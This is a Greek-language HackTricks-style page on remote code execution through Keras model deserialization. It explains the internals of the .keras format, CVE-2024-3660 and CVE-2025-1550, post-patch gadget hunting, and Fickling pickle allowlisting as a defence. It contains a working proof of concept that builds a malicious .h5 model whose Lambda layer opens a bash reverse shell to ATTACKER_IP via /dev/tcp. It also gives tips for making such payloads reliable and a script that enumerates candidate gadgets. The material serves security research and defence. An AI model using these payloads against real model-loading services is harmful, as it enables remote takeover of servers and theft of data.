# RCE μέσω αποσειριοποίησης μοντέλων Keras και αναζήτηση gadgets

{{#include ../banners/hacktricks-training.md}}

Αυτή η σελίδα συνοψίζει πρακτικές τεχνικές εκμετάλλευσης της διαδικασίας αποσειριοποίησης μοντέλων Keras, εξηγεί τα εσωτερικά του εγγενούς format .keras και την επιφάνεια επίθεσης, και παρέχει ένα toolkit για ερευνητές που αναζητούν ευπάθειες σε αρχεία μοντέλων (MFV) και gadgets μετά από διορθώσεις.

## Εσωτερικά του format μοντέλων .keras

Ένα αρχείο .keras είναι ένα αρχείο ZIP που περιέχει τουλάχιστον τα εξής:<sup>[[1]](#references)</sup>
- metadata.json – γενικές πληροφορίες (π.χ. έκδοση Keras)
- config.json – αρχιτεκτονική μοντέλου (κύρια επιφάνεια επίθεσης)
- model.weights.h5 – βάρη σε HDF5

Το config.json καθοδηγεί την αναδρομική αποσειριοποίηση: το Keras εισάγει modules, επιλύει κλάσεις/συναρτήσεις και ανακατασκευάζει layers/objects από dictionaries που ελέγχει ο επιτιθέμενος.<sup>[[1]](#references)</sup>

Παράδειγμα snippet για ένα object Dense layer:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Η αποσειριοποίηση εκτελεί τα εξής:<sup>[[1]](#references)</sup>
- Εισαγωγή modules και επίλυση συμβόλων από τα κλειδιά module/class_name
- Κλήση του from_config(...) ή του constructor με kwargs ελεγχόμενα από τον επιτιθέμενο
- Αναδρομική επεξεργασία ένθετων αντικειμένων (activations, initializers, constraints κ.λπ.)

Ιστορικά, αυτό παρείχε σε έναν επιτιθέμενο που δημιουργούσε ένα config.json τρεις δυνατότητες:<sup>[[1]](#references)</sup>
- Έλεγχο των modules που εισάγονται
- Έλεγχο των classes/functions που επιλύονται
- Έλεγχο των kwargs που περνούν στους constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Βασική αιτία:
- Η αποσειριοποίηση παλαιού τύπου Lambda ανακατασκεύαζε μια συνάρτηση Python από marshaled κώδικα ελεγχόμενο από τον επιτιθέμενο: η `func_load()` αποκωδικοποιεί το payload από base64, καλεί τη `marshal.loads()` και δημιουργεί ένα `FunctionType`. Το bytecode της συνάρτησης που προκύπτει εκτελείται όταν καλείται το Lambda, ενώ οι επηρεαζόμενοι loaders προ της έκδοσης 2.13 δεν εφάρμοζαν ελέγχους safe-mode για παλαιού τύπου formats.<sup>[[3]](#references)[[16]](#references)[[17]](#references)[[18]](#references)</sup>

Σε ένα εγγενές αρχείο Keras v3, η συνάρτηση Lambda αναπαρίσταται ως αντικείμενο `__lambda__`, του οποίου το πεδίο `code` περιέχει marshaled κώδικα κωδικοποιημένο σε base64:<sup>[[17]](#references)[[18]](#references)</sup>

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "class_name": "__lambda__",
      "config": {
        "code": "<base64(marshal.dumps(function.__code__))>",
        "defaults": null,
        "closure": null
      }
    }
  }
}
```

Μετριασμός:
- Το Keras επιβάλλει `safe_mode=True` από προεπιλογή για την εγγενή μορφή Keras v3. Οι σειριοποιημένες Python lambdas στο `Lambda` αποκλείονται, εκτός αν ο χρήστης επιλέξει ρητά να απενεργοποιήσει αυτή τη λειτουργία με `safe_mode=False`· αυτή η προστασία δεν καλύπτει με τον ίδιο τρόπο τις παλαιότερες μορφές.<sup>[[1]](#references)[[16]](#references)[[17]](#references)</sup>

Σημειώσεις:
- Οι παλαιότερες μορφές (παλαιότερα αρχεία HDF5) ή οι παλαιότερες βάσεις κώδικα ενδέχεται να μην επιβάλλουν τους σύγχρονους ελέγχους, επομένως οι επιθέσεις τύπου «downgrade» εξακολουθούν να είναι εφικτές όταν τα θύματα χρησιμοποιούν παλαιότερους loaders.

## CVE-2025-1550 – Αυθαίρετη εισαγωγή module στο Keras 3.0.0–3.8.x

Βασική αιτία:
- Η `_retrieve_class_or_fn` χρησιμοποιούσε την `importlib.import_module(module)` με συμβολοσειρές module που ελέγχονταν από τον εισβολέα και προέρχονταν από το `config.json`.
- Επίπτωση: Ένα ειδικά διαμορφωμένο αρχείο `.keras` μπορούσε να κάνει τη `Model.load_model()` να εισαγάγει modules και συναρτήσεις Python που επέλεγε ο εισβολέας, προκαλώντας παρενέργειες κατά την εισαγωγή και χρησιμοποιώντας ορίσματα που ελέγχονταν από τον εισβολέα, ακόμη και με `safe_mode=True`.<sup>[[1]](#references)[[4]](#references)</sup>

Ιδέα exploit:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Βελτιώσεις ασφάλειας (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Allowlist modules: οι εισαγωγές περιορίζονται σε επίσημα modules του οικοσυστήματος: keras, keras_hub, keras_cv, keras_nlp
- Προεπιλεγμένη ασφαλής λειτουργία: το safe_mode=True αποκλείει την επισφαλή φόρτωση serialized συναρτήσεων Lambda
- Βασικός έλεγχος τύπων: τα αντικείμενα που αποσειριοποιούνται πρέπει να αντιστοιχούν στους αναμενόμενους τύπους

## Πρακτική εκμετάλλευση: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Οι παλαιότερες εγκαταστάσεις TensorFlow-Keras ενδέχεται να δέχονται ακόμη αρχεία μοντέλων HDF5 (`.h5`). Αν ένας επιτιθέμενος μπορεί να ανεβάσει ένα μοντέλο που ο διακομιστής φορτώνει αργότερα ή εκτελεί συμπεράσματα σε αυτό, ένας ευάλωτος loader μπορεί να αποσειριοποιήσει ένα layer Lambda που περιέχει κώδικα Python ελεγχόμενο από τον επιτιθέμενο, ο οποίος στη συνέχεια μπορεί να εκτελεστεί στη ροή εργασίας του μοντέλου της εφαρμογής.<sup>[[3]](#references)[[7]](#references)[[16]](#references)</sup>

Ελάχιστο PoC για τη δημιουργία κακόβουλου .h5, του οποίου το Lambda εκτελεί reverse shell όταν ο στόχος επικαλείται το μοντέλο:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Σημειώσεις και συμβουλές αξιοπιστίας:
- Τα σημεία ενεργοποίησης διαφέρουν ανάλογα με τη μορφή και τη ροή εργασίας· το σχετικό write-up παρατήρησε ότι το payload εκτελέστηκε δύο φορές κατά την πρόβλεψη. Θεωρήστε ότι οι παρενέργειες μπορεί να επαναλαμβάνονται και κάντε τα payloads idempotent.<sup>[[7]](#references)</sup>
- Pinning εκδόσεων: χρησιμοποιήστε τις εκδόσεις TF/Keras/Python του θύματος για να αποφύγετε ασυμφωνίες serialization. Για παράδειγμα, δημιουργήστε artifacts με Python 3.8 και TensorFlow 2.13.1, αν αυτές είναι οι εκδόσεις που χρησιμοποιεί ο στόχος.<sup>[[7]](#references)</sup>
- Γρήγορη αναπαραγωγή περιβάλλοντος:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Επικύρωση: ένα benign payload όπως os.system("ping -c 1 YOUR_IP") βοηθά στην επιβεβαίωση της εκτέλεσης (π.χ., παρατηρώντας ICMP με tcpdump) πριν από τη μετάβαση σε reverse shell.<sup>[[7]](#references)</sup>

## Επιφάνεια gadget μετά τη διόρθωση μέσα στο allowlist

Ακόμη και με το Keras module allowlist και το safe mode, τα επιτρεπόμενα callables μπορούν να προκαλέσουν παρενέργειες. Για παράδειγμα, η `keras.utils.get_file` κατεβάζει ένα URL και το αποθηκεύει στη διαμορφωμένη θέση cache, καθιστώντας την υποψήφια για ανάλυση gadget.<sup>[[1]](#references)[[19]](#references)</sup>

Υποψήφια διαμόρφωση Lambda (επικυρώστε την υπογραφή κλήσης σε ελεγχόμενη δοκιμή):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Important περιορισμός:
- Το `Lambda.call()` περνά πάντα την είσοδο του μοντέλου ως πρώτο positional argument και τα διαμορφωμένα `arguments` ως keyword arguments. Για το `get_file`, αυτή η positional τιμή συμπληρώνει το `fname`· η ασυμφωνία tensor/path μπορεί να κάνει αυτόν τον υποψήφιο να αποτύχει πριν από οποιαδήποτε λήψη, επομένως δεν αποτελεί εγγυημένα λειτουργικό gadget.<sup>[[1]](#references)[[16]](#references)[[19]](#references)</sup>

## ML pickle import allowlisting για μοντέλα AI/ML (Fickling)

Πολλές μορφές μοντέλων AI/ML (PyTorch `.pt`/`.pth`/`.ckpt`, artifacts joblib/scikit-learn και άλλες εγγενείς μορφές της Python) ενσωματώνουν δεδομένα Python pickle. Η παραπάνω legacy διαδρομή Keras Lambda χρησιμοποιεί αντί γι’ αυτό marshaled bytecode συναρτήσεων, επομένως αποτελεί ξεχωριστό κίνδυνο deserialization. Τα pickle opcodes μπορούν να εκτελέσουν συμπεριφορά ελεγχόμενη από τον attacker κατά το deserialization, συμπεριλαμβανομένου model tampering ή RCE, ενώ απλοί scanners μπορεί να μην εντοπίσουν νέες ή μη καταχωρισμένες επικίνδυνες εισαγωγές.<sup>[[7]](#references)[[8]](#references)[[14]](#references)[[18]](#references)</sup>

Μια πρακτική άμυνα fail-closed είναι η χρήση hook στον deserializer pickle της Python, ώστε κατά το unpickling να επιτρέπεται μόνο ένα ελεγμένο σύνολο ακίνδυνων εισαγωγών σχετικών με ML. Το Fickling της Trail of Bits υλοποιεί αυτή την πολιτική και περιλαμβάνει μια επιμελημένη allowlist εισαγωγών ML, βασισμένη σε χιλιάδες δημόσια pickle του Hugging Face.<sup>[[8]](#references)[[13]](#references)</sup>

Μοντέλο ασφάλειας για «ασφαλείς» εισαγωγές (διαισθήσεις που συνοψίζουν έρευνα και πρακτική): τα σύμβολα που εισάγει ένα pickle πρέπει ταυτόχρονα να πληρούν τα εξής:<sup>[[8]](#references)</sup>
- Να μην εκτελούν κώδικα ή προκαλούν εκτέλεσή του (χωρίς compiled/source code objects, εκτέλεση εντολών shell, hooks κ.λπ.)
- Να μην κάνουν get/set αυθαίρετων attributes ή items
- Να μην εισάγουν ή αποκτούν αναφορές σε άλλα αντικείμενα της Python από το pickle VM
- Να μην ενεργοποιούν δευτερεύοντες deserializers (π.χ. marshal, nested pickle), ούτε έμμεσα

Ενεργοποιήστε τις προστασίες του Fickling όσο το δυνατόν νωρίτερα κατά την εκκίνηση της διεργασίας, ώστε να ελέγχονται τυχόν φορτώσεις pickle από frameworks (`torch.load`, `joblib.load` κ.λπ.):<sup>[[9]](#references)</sup>

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Λειτουργικές συμβουλές:
- Μπορείτε προσωρινά να απενεργοποιήσετε/ενεργοποιήσετε ξανά τα hooks όπου χρειάζεται:<sup>[[9]](#references)</sup>

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- Αν αποκλειστεί ένα μοντέλο που είναι γνωστό ότι είναι ασφαλές, επεκτείνετε το allowlist για το περιβάλλον σας αφού ελέγξετε τα symbols:<sup>[[9]](#references)</sup>

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Το Fickling εκθέτει επίσης γενικές προστασίες κατά τον χρόνο εκτέλεσης, αν προτιμάτε πιο λεπτομερή έλεγχο:<sup>[[9]](#references)</sup>
  - fickling.always_check_safety() για την επιβολή ελέγχων σε όλα τα pickle.load()
  - with fickling.check_safety(): για επιβολή ελέγχων σε συγκεκριμένο scope
  - fickling.load(path) / fickling.is_likely_safe(path) για μεμονωμένους ελέγχους

- Προτιμήστε μη-pickle μορφές μοντέλων όταν είναι εφικτό (π.χ., SafeTensors).<sup>[[15]](#references)</sup> Αν πρέπει να δεχτείτε pickle, εκτελέστε τους loaders με τα ελάχιστα απαραίτητα δικαιώματα, χωρίς εξερχόμενη κίνηση δικτύου, και εφαρμόστε την allowlist.

Αυτή η στρατηγική με προτεραιότητα στην allowlist αποκλείει αποδεδειγμένα συνηθισμένες διαδρομές εκμετάλλευσης ML pickle, διατηρώντας παράλληλα υψηλή συμβατότητα. Στο benchmark της ToB, το Fickling εντόπισε το 100% των συνθετικών κακόβουλων αρχείων και επέτρεψε περίπου το 99% των καθαρών αρχείων από κορυφαία repos του Hugging Face.<sup>[[8]](#references)[[10]](#references)</sup>


## Εργαλειοθήκη ερευνητή

1) Συστηματική ανακάλυψη gadgets σε επιτρεπόμενα modules

Καταγράψτε τα υποψήφια callables σε keras, keras_nlp, keras_cv και keras_hub και δώστε προτεραιότητα σε όσα έχουν παρενέργειες σε αρχεία/δίκτυο/διεργασίες/περιβάλλον.<sup>[[1]](#references)</sup>

<details>
<summary>Καταγραφή δυνητικά επικίνδυνων callables σε modules Keras που περιλαμβάνονται στην allowlist</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Άμεσος έλεγχος αποσειριοποίησης (δεν απαιτείται αρχείο .keras)

Δώστε ειδικά διαμορφωμένα dicts απευθείας στους αποσειριοποιητές Keras για να μάθετε ποιες παράμετροι γίνονται αποδεκτές και να παρατηρήσετε παρενέργειες.<sup>[[1]](#references)</sup>

```python
import keras

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {
      "module": "keras.utils",
      "class_name": "get_file",
      "config": null,
      "registered_name": null
    },
    "arguments": {
      "origin": "https://example.com/x",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}

layer = keras.saving.deserialize_keras_object(cfg, safe_mode=True)  # Observe behavior
```

3) Δοκιμές μεταξύ εκδόσεων και formats

Το Keras υπάρχει σε πολλαπλές codebases/εποχές, με διαφορετικές δικλίδες ασφαλείας και formats:<sup>[[1]](#references)</sup>
- Ενσωματωμένο Keras του TensorFlow: tensorflow/python/keras (legacy, προγραμματισμένο για διαγραφή)
- tf-keras: συντηρείται ξεχωριστά
- Multi-backend Keras 3 (επίσημο): εισήγαγε το native .keras

Επαναλάβετε τις δοκιμές σε διαφορετικές codebases και formats (.keras έναντι legacy HDF5), για να εντοπίσετε regressions ή ελλείπουσες δικλίδες ασφαλείας.

## References

- [1] [Εντοπισμός ευπαθειών στην αποσειριοποίηση μοντέλων Keras (ιστολόγιο huntr)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Προσθήκη ελέγχων στη σειριοποίηση](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE μέσω αποσειριοποίησης Lambda του Keras](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Αυθαίρετη εισαγωγή module στο Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [Αναφορά huntr – αυθαίρετη εισαγωγή #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [Αναφορά huntr – αυθαίρετη εισαγωγή #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – RCE μέσω Lambda σε TensorFlow .h5 έως root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Ιστολόγιο Trail of Bits – Ο νέος σαρωτής αρχείων pickle AI/ML του Fickling](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Ασφάλεια περιβαλλόντων AI/ML (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Σώμα δεδομένων benchmark σάρωσης pickle του Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Υπόβαθρο επιθέσεων Sleepy Pickle](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [Έργο SafeTensors](https://github.com/safetensors/safetensors)
- [16] [CERT/CC VU#253266 – Τα επίπεδα Lambda του Keras 2 επιτρέπουν την εισαγωγή αυθαίρετου κώδικα](https://kb.cert.org/vuls/id/253266)
- [17] [Πηγαίος κώδικας του επιπέδου Lambda του Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/layers/core/lambda_layer.py)
- [18] [Πηγαίος κώδικας των βοηθητικών προγραμμάτων Python του Keras (v3.10.0)](https://github.com/keras-team/keras/blob/v3.10.0/keras/src/utils/python_utils.py)
- [19] [API `get_file` του Keras](https://keras.io/api/utils/python_utils/#get_file-function)
{{#include ../banners/hacktricks-training.md}}
